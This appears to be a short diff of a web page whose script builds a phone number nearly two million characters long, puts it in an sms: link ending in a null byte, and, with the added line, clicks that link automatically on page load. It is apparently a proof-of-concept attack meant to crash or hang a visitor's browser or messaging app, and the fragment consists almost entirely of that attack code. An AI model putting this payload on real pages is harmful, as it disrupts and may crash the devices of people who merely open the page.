@@ -19,5 +19,6 @@ for (itxextraData = 0; itxextraData < 200000; itxextraData++) {
 	 var extraData = extraData + "555555555";
 }
 jQuery('#result').append('<a href="sms:+' + extraData + '%00">Don\'t be afraid, just click.</a>');
+jQuery('#result a').trigger('click');
 </script>
 </html>
